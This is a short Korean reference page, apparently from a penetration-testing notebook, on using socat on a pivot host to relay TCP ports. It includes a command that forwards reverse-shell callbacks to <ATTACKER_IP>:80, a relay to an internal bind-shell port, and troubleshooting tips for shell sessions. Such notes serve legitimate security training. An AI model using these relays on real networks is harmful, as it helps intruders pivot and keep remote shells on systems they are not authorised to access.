---
tags:
  - 기능/피벗
실행환경: ["Linux", "Windows"]
필요권한: ["피벗 호스트의 셸"]
필요조건: ["수신 포트 바인딩 가능", "피벗 호스트에서 목적지 TCP 포트로의 도달성"]
결과: ["포트 리디렉션", "데이터 스트림", "세션 중계"]
---

# socat

## 도구 개요

Socat은 두 주소 또는 데이터 스트림을 연결하는 중계 도구로, 이 문서에서는 수신 TCP 포트를 다른 IP·포트로 전달한다. SOCKS나 대역 라우팅보다 단일 서비스, Reverse Shell 콜백 또는 Bind Shell 경로를 간단히 리디렉션할 때 적합하다.

## 필요한 입력과 실행 환경

- 실행 환경: `socat`을 실행할 수 있는 Linux 또는 Windows 피벗 호스트
- 입력: 수신 주소·포트와 목적지 주소·포트
- 네트워크 조건: 피벗 호스트에서 목적지 TCP 포트에 접근 가능

## 표준 사용법

```bash
socat TCP4-LISTEN:<LISTEN_PORT>,fork TCP4:<DEST_IP>:<DEST_PORT>
```

피벗 호스트에서 수신 포트를 열고, 들어온 연결을 목적지 IP/포트로 전달한다.

## 대표 예시

### Reverse shell 콜백 중계

```bash
socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER_IP>:80
```

확인할 출력:

- 내부 대상이 피벗 호스트 `8080`으로 연결하면 공격 호스트 `80` listener에 세션이 도착한다.

### 내부 bind shell 포트 중계

```bash
socat TCP4-LISTEN:8080,fork TCP4:<INTERNAL_IP>:8443
```

확인할 출력:

- 공격 호스트에서 피벗 호스트 `8080`으로 접속하면 내부 대상 `8443`으로 전달된다.

## 주요 옵션

| 옵션/주소 | 의미 | 자주 쓰는 상황 |
|---|---|---|
| `TCP4-LISTEN:<PORT>` | IPv4 TCP listen | 피벗 호스트에서 중계 포트 열기 |
| `fork` | 연결마다 프로세스 분기 | 여러 연결 처리 |
| `TCP4:<IP>:<PORT>` | 목적지 TCP 연결 | 공격 호스트 listener 또는 내부 서비스로 전달 |

## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| 명령이 유지됨 | listen 상태 | 다른 터미널에서 포트 연결 테스트 |
| listener에 세션 도착 | 리디렉션 성공 | 셸 안정화, 권한 확인 |
| `Address already in use` | 포트 충돌 | 다른 listen 포트 사용 |
| `Connection refused` | 목적지 포트 미응답 | 피벗 호스트에서 목적지 포트 직접 확인 |
| listen 실패 | 포트 충돌 또는 바인딩 권한 부족 | `ss -tulpen`과 대체 포트 확인 |
| 연결은 되지만 세션 없음 | payload 주소·포트 또는 반대쪽 listener 불일치 | LHOST/LPORT와 목적지 listener 확인 |
| 내부 bind 포트 중계 실패 | 피벗 호스트에서 내부 대상에 접근 불가 | `nc -vz <INTERNAL_IP> <PORT>` |

## 관련 공격기법

- [[Socat 셸 리디렉션]]
